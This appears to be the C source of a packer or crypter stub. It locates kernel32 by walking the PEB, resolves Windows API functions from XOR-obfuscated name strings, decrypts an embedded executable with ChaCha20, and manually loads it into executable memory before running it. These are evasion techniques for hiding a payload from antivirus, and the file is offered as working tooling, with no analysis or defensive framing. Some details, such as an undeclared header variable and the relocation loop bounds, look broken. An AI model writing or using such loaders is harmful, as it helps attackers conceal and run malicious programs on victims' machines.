#include "stub.h"

// declare key, exe ptr, and size in .data section to be added by packer
uint8_t key[KEY_SIZE] = { 0xFF };
void* encrypted_exe = &key; // dereference ptr for reloc entry
uint32_t size = 1;

char xorKey[] = { 0x2f, 0x84, 0x18, 0x8e, 0x13, 0xaa, 0x49, 0xed, 0xa7, 0x57, 0xda, 0x2b, 0xf4, 0x61, 0x8b };
char sGetProcAddress[] = { 0x68, 0xe1, 0x6c, 0xde, 0x61, 0xc5, 0x2a, 0xac, 0xc3, 0x33, 0xa8, 0x4e, 0x87, 0x12, 0x8b };
char sVirtualAlloc[] = { 0x79, 0xed, 0x6a, 0xfa, 0x66, 0xcb, 0x25, 0xac, 0xcb, 0x3b, 0xb5, 0x48, 0xf4 };
char sLoadLibraryA[] = { 0x63, 0xeb, 0x79, 0xea, 0x5f, 0xc3, 0x2b, 0x9f, 0xc6, 0x25, 0xa3, 0x6a, 0xf4 };
char sExitProcess[] = { 0x6a, 0xfc, 0x71, 0xfa, 0x43, 0xd8, 0x26, 0x8e, 0xc2, 0x24, 0xa9, 0x2b };
uint64_t* (*xGetProcAddress)(void*, uint8_t*) = NULL;
uint64_t* (*xVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = NULL;
void* (*xLoadLibraryA)(uint8_t*) = NULL;
void (*xExitProcess)(UINT) = NULL;

int main(int argc, char* argv[])
{
	void* exe = NULL;
	uint8_t* program = NULL;
	chacha20_ctx ctx;
	PIMAGE_OPTIONAL_HEADER opHeader;
	PIMAGE_SECTION_HEADER section;
	PIMAGE_IMPORT_DESCRIPTOR import;

	// find kernel32.dll
	PPEB peb = *(PPEB*)(_readgsbase_u64() + 0x60);
	PPEB_LDR_DATA ldr = peb->Ldr;
	PLIST_ENTRY modules = ldr->InMemoryOrderModuleList.Flink;
	PLIST_ENTRY thisImage = modules->Flink;
	uint8_t* ntdll = thisImage->Flink;
	uint8_t* kernel32 = *(uint8_t**)(ntdll + (sizeof(PVOID) * 4));
	
	// find GetProcAddress
	ntHeader = (PIMAGE_NT_HEADERS)((uint8_t*)kernel32 + ((IMAGE_DOS_HEADER*)kernel32)->e_lfanew);
	opHeader = &ntHeader->OptionalHeader;
	IMAGE_DATA_DIRECTORY etable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY exports = kernel32 + etable.VirtualAddress;

	for (int i = 0; i < sizeof(sGetProcAddress); i++)
	{
		sGetProcAddress[i] ^= xorKey[i];
	}
	for (int i = 0; i < sizeof(sVirtualAlloc); i++)
	{
		sVirtualAlloc[i] ^= xorKey[i];
	}
	for (int i = 0; i < sizeof(sLoadLibraryA); i++)
	{
		sLoadLibraryA[i] ^= xorKey[i];
	}
	for (int i = 0; i < sizeof(sExitProcess); i++)
	{
		sExitProcess[i] ^= xorKey[i];
	}

	uint32_t* exportFunc = kernel32 + exports->AddressOfFunctions;
	uint32_t* exportName = kernel32 + exports->AddressOfNames;
	uint16_t* exportOrdinal = kernel32 + exports->AddressOfNameOrdinals;

	for (uint16_t i = 0; i < exports->NumberOfNames; i++)
	{
		uint8_t* name = kernel32 + exportName[i];
		BOOL equal = TRUE;

		// strcmp
		for (int j = 0; sGetProcAddress[j] != '\0'; j++)
		{
			if (name[j] == '\0')
			{
				equal = FALSE;
				break;
			}
			if (name[j] != sGetProcAddress[j])
				equal = FALSE;
		}

		if (equal)
		{
			uint32_t rva = exportFunc[exportOrdinal[i]];

			xGetProcAddress = kernel32 + rva;
		}
	}

	// resolve other functions
	xVirtualAlloc = xGetProcAddress(kernel32, sVirtualAlloc);
	xLoadLibraryA = xGetProcAddress(kernel32, sLoadLibraryA);
	xExitProcess = xGetProcAddress(kernel32, sExitProcess);

	if (size < 2) xExitProcess(1); // stub doesn't execute alone

	exe = xVirtualAlloc(
		NULL,
		size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!exe) xExitProcess(1);
	
	// decrypt executable
	chacha20_setup(&ctx, key, KEY_SIZE, key); // confidentiality is not a priority
	chacha20_decrypt(&ctx, encrypted_exe, exe, size);

	// manually load executable into memory
	ntHeader = (PIMAGE_NT_HEADERS)((uint8_t*)exe + ((IMAGE_DOS_HEADER*)exe)->e_lfanew);
	opHeader = &ntHeader->OptionalHeader;
	uint32_t vaSize = 0;

	section = IMAGE_FIRST_SECTION(ntHeader);
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		if (section->VirtualAddress > vaSize)
		{
			vaSize = section->VirtualAddress + section->SizeOfRawData;
		}
		section++;
	}

	program = xVirtualAlloc(
		NULL,
		vaSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!program) xExitProcess(1);

	// load sections
	section = IMAGE_FIRST_SECTION(ntHeader);
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		// memcpy
		for (int j = 0; j < section->SizeOfRawData; j++)
		{
			(program + section->VirtualAddress)[j] = ((uint8_t*)exe + section->PointerToRawData)[j];
		}

		section++;
	}

	// dynamically load imports
	section = IMAGE_FIRST_SECTION(ntHeader);
	IMAGE_DATA_DIRECTORY itable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	DWORD itableOffset = offset(itable.VirtualAddress, section);
	if (itable.Size)
	{
		for (PIMAGE_IMPORT_DESCRIPTOR i = (uint8_t*)exe + itableOffset; i->Name; i++)
		{
			HMODULE module = xLoadLibraryA((uint8_t*)exe + offset(i->Name, section));
			if (!module) xExitProcess(1);

			// 64 bit
			int k = 0;
			for (uint64_t* j = (uint8_t*)exe + offset(i->Characteristics, section); *j; j++, k++)
			{
				FARPROC importFunc;

				if (*j & 0x8000000000000000) // if importing by ordinal
				{
					importFunc = xGetProcAddress(module, *j & 0xFFFF);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME hint = (uint8_t*)exe + offset(*j & 0xFFFFFFFF, section);

					importFunc = xGetProcAddress(module, &hint->Name);
				}

				((uint64_t*)(program + i->FirstThunk))[k] = importFunc;
			}
		}
	}
	
	// fix relocations
	int64_t aslr = program - opHeader->ImageBase;

	IMAGE_DATA_DIRECTORY rtable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	uint16_t rtableOffset = offset(rtable.VirtualAddress, section);
	uint64_t rtableEnd = (uint8_t*)exe + rtableOffset + rtable.Size;
	if (rtable.Size)
	{
		for (PIMAGE_BASE_RELOCATION i = (uint8_t*)exe + rtableOffset; i < rtableEnd; (uint8_t*)i += i->SizeOfBlock)
		{
			uint16_t* reloc = (uint8_t*)i + sizeof(IMAGE_BASE_RELOCATION);

			for (uint16_t* j = reloc; j < reloc + i->SizeOfBlock; j++)
			{
				uint16_t relocOffset = offset(i->VirtualAddress + (*j & 0xFFF), section);

				if ((*j >> 12 == IMAGE_REL_BASED_HIGHLOW))
				{
					*(uint32_t*)(program + relocOffset) += aslr;
				}
				else if (*j >> 12 == IMAGE_REL_BASED_DIR64)
				{
					*(uint64_t*)(program + relocOffset) += aslr;
				}
			}
		}
	}

	// execute decrypted program
	void (*binary)() = program + opHeader->AddressOfEntryPoint;

	binary();

	return 0;
}